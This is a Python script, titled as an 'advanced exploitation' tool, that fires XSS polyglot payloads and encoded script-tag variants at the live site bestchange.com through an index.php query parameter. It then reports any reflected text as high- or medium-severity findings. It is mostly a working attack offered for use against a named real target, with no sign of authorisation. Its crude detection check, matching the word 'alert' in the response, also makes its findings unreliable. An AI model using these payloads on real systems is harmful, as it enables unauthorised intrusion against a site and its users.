#!/usr/bin/env python3
"""
BestChange.com Advanced Exploitation
Advanced exploitation techniques and payloads
"""

import requests
import time
import random
import base64

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

class AdvancedExploiter:
    def __init__(self, base_url="https://www.bestchange.com"):
        self.base_url = base_url
        self.session = requests.Session()
        self.findings = []
        self.setup_session()
    
    def setup_session(self):
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        self.session.timeout = 10
    
    def test_polyglot_payloads(self):
        """Test polyglot payloads that work in multiple contexts"""
        print(f"{Colors.BLUE}[*] Testing polyglot payloads...{Colors.RESET}")
        
        polyglots = [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
            "<img src=x onerror=\"alert('XSS')\">",
            "<svg/onload=alert('XSS')>",
        ]
        
        for payload in polyglots:
            try:
                url = f"{self.base_url}/index.php"
                response = self.session.get(url, params={'test': payload}, timeout=5)
                time.sleep(0.2)
                
                if payload[:20] in response.text or 'alert' in response.text.lower():
                    self.findings.append({
                        'type': 'Polyglot XSS',
                        'location': 'index.php?test',
                        'payload': payload[:50],
                        'severity': 'HIGH'
                    })
                    print(f"{Colors.RED}[!] Polyglot XSS potential{Colors.RESET}")
            except:
                continue
    
    def test_encoding_bypasses(self):
        """Test various encoding bypasses"""
        print(f"{Colors.BLUE}[*] Testing encoding bypasses...{Colors.RESET}")
        
        payload = "<script>alert(1)</script>"
        encodings = [
            (payload, "Plain"),
            (base64.b64encode(payload.encode()).decode(), "Base64"),
            ('%3Cscript%3Ealert%281%29%3C%2Fscript%3E', "URL encoded"),
            ('&#60;script&#62;alert(1)&#60;/script&#62;', "HTML entities"),
        ]
        
        for encoded, encoding_type in encodings:
            try:
                url = f"{self.base_url}/index.php"
                response = self.session.get(url, params={'test': encoded}, timeout=5)
                time.sleep(0.2)
                
                if 'script' in response.text.lower() or 'alert' in response.text.lower():
                    self.findings.append({
                        'type': f'XSS via {encoding_type}',
                        'location': 'index.php?test',
                        'severity': 'MEDIUM'
                    })
            except:
                continue
    
    def generate_report(self):
        """Generate report"""
        print(f"\n{Colors.YELLOW}{'='*70}{Colors.RESET}")
        print(f"{Colors.YELLOW}ADVANCED EXPLOITATION REPORT{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*70}{Colors.RESET}\n")
        
        if self.findings:
            print(f"{Colors.RED}[!] Found {len(self.findings)} finding(s){Colors.RESET}\n")
            for finding in self.findings:
                color = Colors.RED if finding['severity'] == 'HIGH' else Colors.YELLOW
                print(f"{color}[{finding['severity']}] {finding['type']}{Colors.RESET}")
                print(f"    {finding['location']}\n")
        else:
            print(f"{Colors.GREEN}[+] No additional exploitation vectors found{Colors.RESET}")

def main():
    print(f"{Colors.BLUE}{'='*70}{Colors.RESET}")
    print(f"{Colors.BLUE}BestChange.com Advanced Exploitation{Colors.RESET}")
    print(f"{Colors.BLUE}{'='*70}{Colors.RESET}\n")
    
    exploiter = AdvancedExploiter()
    
    try:
        exploiter.test_polyglot_payloads()
        exploiter.test_encoding_bypasses()
    except Exception as e:
        print(f"{Colors.RED}Error: {str(e)}{Colors.RESET}")
    
    exploiter.generate_report()

if __name__ == "__main__":
    main()
